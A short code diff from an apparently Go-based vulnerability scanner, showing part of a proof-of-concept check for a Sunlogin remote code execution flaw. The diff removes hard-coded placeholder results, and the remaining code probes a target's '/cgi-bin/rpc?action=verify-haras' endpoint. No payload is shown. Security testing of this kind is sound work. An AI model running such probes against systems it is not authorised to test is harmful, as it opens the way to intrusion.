@@ -20,8 +20,6 @@ type jsonResult struct {
 
 func (self *Poc_SunloginRCE) Poc1() (pocResult poc_model.PocPerPayloadResult) {
 	// 默认配置
-	pocResult.Status = true
-	pocResult.Messages = "tests"
 	headers := self.GetInitPocHeaders()
 	resp := self.HttpGet(self.AddUri(self.Params.Target, "/cgi-bin/rpc?action=verify-haras"), headers)
 	if resp.Err != nil {
